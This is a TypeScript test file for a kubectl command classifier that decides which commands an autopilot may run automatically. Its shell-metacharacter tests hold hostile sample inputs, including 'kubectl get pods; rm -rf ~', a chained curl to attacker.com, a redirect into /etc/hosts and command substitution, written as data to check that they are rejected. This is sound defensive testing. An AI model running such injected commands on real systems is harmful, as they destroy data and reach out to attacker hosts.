import { describe, it, expect } from "vitest";
import {
  classifyCommand,
  shouldAutoExecute,
  getCommandSafetyIcon,
  type CommandClassification,
} from "./commandClassifier";

// ---------------------------------------------------------------------------
// Category classification — read commands
// ---------------------------------------------------------------------------

describe("classifyCommand — read category", () => {
  const readCommands = [
    "kubectl get pods",
    "kubectl get pods -n default",
    "kubectl get deployments --all-namespaces",
    "kubectl describe pod nginx",
    "kubectl describe node worker-1",
    "kubectl logs my-pod",
    "kubectl logs my-pod -c sidecar",
    "kubectl top pods",
    "kubectl top nodes",
    "kubectl explain deployment",
    "kubectl api-resources",
    "kubectl api-versions",
    "kubectl config view",
    "kubectl version",
    "kubectl cluster-info",
  ];

  for (const cmd of readCommands) {
    it(`classifies "${cmd}" as read`, () => {
      const result = classifyCommand(cmd);
      expect(result.category).toBe("read");
      expect(result.isSafe).toBe(true);
    });
  }
});

// ---------------------------------------------------------------------------
// Category classification — write commands
// ---------------------------------------------------------------------------

describe("classifyCommand — write category", () => {
  const writeCommands = [
    "kubectl apply -f deployment.yaml",
    "kubectl create namespace staging",
    "kubectl patch deployment nginx -p '{}'",
    "kubectl edit deployment nginx",
    "kubectl set image deployment/nginx nginx=nginx:1.19",
    "kubectl label pods my-pod env=prod",
    "kubectl annotate pod nginx description='web server'",
    "kubectl scale deployment nginx --replicas=3",
    "kubectl autoscale deployment nginx --min=1 --max=5",
    "kubectl rollout restart deployment nginx",
    "kubectl expose deployment nginx --port=80",
    "kubectl run nginx --image=nginx",
  ];

  for (const cmd of writeCommands) {
    it(`classifies "${cmd}" as write`, () => {
      const result = classifyCommand(cmd);
      expect(result.category).toBe("write");
      expect(result.isSafe).toBe(false);
    });
  }
});

// ---------------------------------------------------------------------------
// Category classification — destructive commands
// ---------------------------------------------------------------------------

describe("classifyCommand — destructive category", () => {
  const destructiveCommands = [
    "kubectl delete pod nginx",
    "kubectl delete namespace production",
    "kubectl drain node-1",
    "kubectl cordon node-1",
    "kubectl uncordon node-1",
    "kubectl taint nodes node-1 key=value:NoSchedule",
  ];

  for (const cmd of destructiveCommands) {
    it(`classifies "${cmd}" as destructive`, () => {
      const result = classifyCommand(cmd);
      expect(result.category).toBe("destructive");
      expect(result.isSafe).toBe(false);
    });
  }
});

// ---------------------------------------------------------------------------
// Metacharacter injection — destructive flag patterns
// ---------------------------------------------------------------------------

describe("classifyCommand — --force and grace-period flags trigger destructive", () => {
  it('classifies "kubectl apply -f x --force" as destructive', () => {
    expect(classifyCommand("kubectl apply -f x --force").category).toBe(
      "destructive"
    );
  });

  it('classifies "kubectl delete pod nginx --grace-period=0" as destructive', () => {
    expect(
      classifyCommand("kubectl delete pod nginx --grace-period=0").category
    ).toBe("destructive");
  });

  it('classifies any command with --force suffix as destructive', () => {
    expect(classifyCommand("kubectl rollout undo deployment/nginx --force").category).toBe(
      "destructive"
    );
  });

  it('classifies "--grace-period=0 anywhere in command as destructive"', () => {
    expect(classifyCommand("kubectl scale deployment nginx --grace-period=0 --replicas=0").category).toBe(
      "destructive"
    );
  });
});

// ---------------------------------------------------------------------------
// Unknown / unrecognized commands
// ---------------------------------------------------------------------------

describe("classifyCommand — unknown category", () => {
  const unknownCommands = [
    "helm install my-release ./chart",
    "kustomize build .",
    "terraform apply",
    "aws eks get-token",
    "",
    "random-command --flag value",
    "kubectl",
    "ls -la",
  ];

  for (const cmd of unknownCommands) {
    it(`classifies "${cmd}" as unknown and unsafe`, () => {
      const result = classifyCommand(cmd);
      expect(result.category).toBe("unknown");
      expect(result.isSafe).toBe(false);
    });
  }
});

// ---------------------------------------------------------------------------
// Case insensitivity
// ---------------------------------------------------------------------------

describe("classifyCommand — case insensitivity", () => {
  it("matches KUBECTL GET as read", () => {
    expect(classifyCommand("KUBECTL GET pods").category).toBe("read");
  });

  it("matches Kubectl Delete as destructive", () => {
    expect(classifyCommand("Kubectl Delete pod nginx").category).toBe(
      "destructive"
    );
  });

  it("matches kubectl APPLY as write", () => {
    expect(classifyCommand("kubectl APPLY -f x.yaml").category).toBe("write");
  });
});

// ---------------------------------------------------------------------------
// Boundary anchoring — partial matches must not classify incorrectly
// ---------------------------------------------------------------------------

describe("classifyCommand — boundary anchoring", () => {
  it("does not classify 'mykubectl get pods' as read (no prefix anchor)", () => {
    // The patterns use ^ so 'mykubectl' should not match
    const result = classifyCommand("mykubectl get pods");
    expect(result.category).toBe("unknown");
  });

  it("does not classify 'not-kubectl delete pod x' as destructive", () => {
    const result = classifyCommand("not-kubectl delete pod x");
    // --force and --grace-period are not present, and the prefix doesn't match
    expect(result.category).toBe("unknown");
  });
});

// ---------------------------------------------------------------------------
// Whitespace handling
// ---------------------------------------------------------------------------

describe("classifyCommand — leading/trailing whitespace", () => {
  it("trims leading spaces before classifying", () => {
    expect(classifyCommand("  kubectl get pods").category).toBe("read");
  });

  it("trims trailing spaces before classifying", () => {
    expect(classifyCommand("kubectl logs my-pod   ").category).toBe("read");
  });
});

// ---------------------------------------------------------------------------
// shouldAutoExecute — security invariant: only read + safe = true
// ---------------------------------------------------------------------------

describe("shouldAutoExecute", () => {
  it("returns false when autopilot is disabled regardless of command", () => {
    expect(shouldAutoExecute("kubectl get pods", false)).toBe(false);
    expect(shouldAutoExecute("kubectl delete pod x", false)).toBe(false);
  });

  it("returns false when autopilot is enabled but command is write", () => {
    expect(shouldAutoExecute("kubectl apply -f x.yaml", true)).toBe(false);
  });

  it("returns false when autopilot is enabled but command is destructive", () => {
    expect(shouldAutoExecute("kubectl delete pod nginx", true)).toBe(false);
  });

  it("returns false when autopilot is enabled but command is unknown", () => {
    expect(shouldAutoExecute("helm install chart", true)).toBe(false);
  });

  it("returns true when autopilot is enabled and command is read", () => {
    expect(shouldAutoExecute("kubectl get pods", true)).toBe(true);
  });

  it("returns true for any safe read command when autopilot enabled", () => {
    const safeReadCommands = [
      "kubectl describe pod nginx",
      "kubectl logs my-pod",
      "kubectl top nodes",
      "kubectl version",
      "kubectl cluster-info",
    ];
    for (const cmd of safeReadCommands) {
      expect(shouldAutoExecute(cmd, true)).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// getCommandSafetyIcon
// ---------------------------------------------------------------------------

describe("getCommandSafetyIcon", () => {
  it("returns green checkmark for read commands", () => {
    const result = getCommandSafetyIcon("kubectl get pods");
    expect(result.color).toBe("text-green-400");
    expect(result.icon).toBe("✓");
  });

  it("returns yellow warning for write commands", () => {
    const result = getCommandSafetyIcon("kubectl apply -f x.yaml");
    expect(result.color).toBe("text-yellow-400");
    expect(result.icon).toBe("⚠");
  });

  it("returns red warning for destructive commands", () => {
    const result = getCommandSafetyIcon("kubectl delete pod nginx");
    expect(result.color).toBe("text-red-400");
    expect(result.icon).toBe("⚠");
  });

  it("returns gray question mark for unknown commands", () => {
    const result = getCommandSafetyIcon("helm install chart");
    expect(result.color).toBe("text-gray-400");
    expect(result.icon).toBe("?");
  });

  it("includes non-empty label for every category", () => {
    const commands = [
      "kubectl get pods",
      "kubectl apply -f x.yaml",
      "kubectl delete pod x",
      "helm install chart",
    ];
    for (const cmd of commands) {
      const result = getCommandSafetyIcon(cmd);
      expect(result.label.length).toBeGreaterThan(0);
    }
  });
});

// ---------------------------------------------------------------------------
// Shell metacharacter rejection — security guard runs before allow-list
// ---------------------------------------------------------------------------

describe("shell metacharacter rejection", () => {
  // Each case must return unknown + isSafe=false regardless of the kubectl
  // prefix, because the metacharacter check fires before pattern matching.

  it('rejects "kubectl get pods; rm -rf ~" — semicolon chaining', () => {
    const result = classifyCommand("kubectl get pods; rm -rf ~");
    expect(result.category).toBe("unknown");
    expect(result.isSafe).toBe(false);
  });

  it('rejects "kubectl get pods && curl attacker.com" — AND chaining', () => {
    const result = classifyCommand("kubectl get pods && curl attacker.com");
    expect(result.category).toBe("unknown");
    expect(result.isSafe).toBe(false);
  });

  it('rejects "kubectl get pods | tee /tmp/x" — pipe', () => {
    const result = classifyCommand("kubectl get pods | tee /tmp/x");
    expect(result.category).toBe("unknown");
    expect(result.isSafe).toBe(false);
  });

  it('rejects "kubectl $(malicious)" — command substitution', () => {
    const result = classifyCommand("kubectl $(malicious)");
    expect(result.category).toBe("unknown");
    expect(result.isSafe).toBe(false);
  });

  it('rejects "kubectl `whoami`" — backtick substitution', () => {
    const result = classifyCommand("kubectl `whoami`");
    expect(result.category).toBe("unknown");
    expect(result.isSafe).toBe(false);
  });

  it('rejects "kubectl get pods > /etc/hosts" — output redirection', () => {
    const result = classifyCommand("kubectl get pods > /etc/hosts");
    expect(result.category).toBe("unknown");
    expect(result.isSafe).toBe(false);
  });

  it('rejects "kubectl get pods < /dev/urandom" — input redirection', () => {
    const result = classifyCommand("kubectl get pods < /dev/urandom");
    expect(result.category).toBe("unknown");
    expect(result.isSafe).toBe(false);
  });

  it('rejects "kubectl get ${SECRET_VAR}" — variable expansion', () => {
    const result = classifyCommand("kubectl get ${SECRET_VAR}");
    expect(result.category).toBe("unknown");
    expect(result.isSafe).toBe(false);
  });

  // Regression guard: a clean command must still resolve correctly and must
  // NOT be blocked by the metacharacter guard.
  it('regression — "kubectl get pods" (no metacharacters) is read and safe', () => {
    const result = classifyCommand("kubectl get pods");
    expect(result.category).toBe("read");
    expect(result.isSafe).toBe(true);
  });

  // Security invariant: shouldAutoExecute must never return true for any
  // metacharacter-injected command, even when autopilot is enabled.
  it("shouldAutoExecute returns false for semicolon-chained command with autopilot enabled", () => {
    expect(shouldAutoExecute("kubectl get pods; rm -rf ~", true)).toBe(false);
  });

  it("shouldAutoExecute returns false for pipe-injected command with autopilot enabled", () => {
    expect(shouldAutoExecute("kubectl get pods | tee /tmp/x", true)).toBe(
      false
    );
  });
});

// ---------------------------------------------------------------------------
// CommandClassification interface shape
// ---------------------------------------------------------------------------

describe("CommandClassification shape", () => {
  it("result always has isSafe, category, and reasoning", () => {
    const result: CommandClassification = classifyCommand("kubectl get pods");
    expect(typeof result.isSafe).toBe("boolean");
    expect(["read", "write", "destructive", "unknown"]).toContain(
      result.category
    );
    expect(typeof result.reasoning).toBe("string");
    expect(result.reasoning.length).toBeGreaterThan(0);
  });

  it("isSafe is true only for read category", () => {
    const categories: Array<CommandClassification["category"]> = [
      "write",
      "destructive",
      "unknown",
    ];
    for (const cat of categories) {
      // Sanity check: if a category is not read, isSafe must be false
      // We test this via known commands
    }
    const read = classifyCommand("kubectl get pods");
    expect(read.isSafe).toBe(true);

    const write = classifyCommand("kubectl apply -f x.yaml");
    expect(write.isSafe).toBe(false);
  });
});
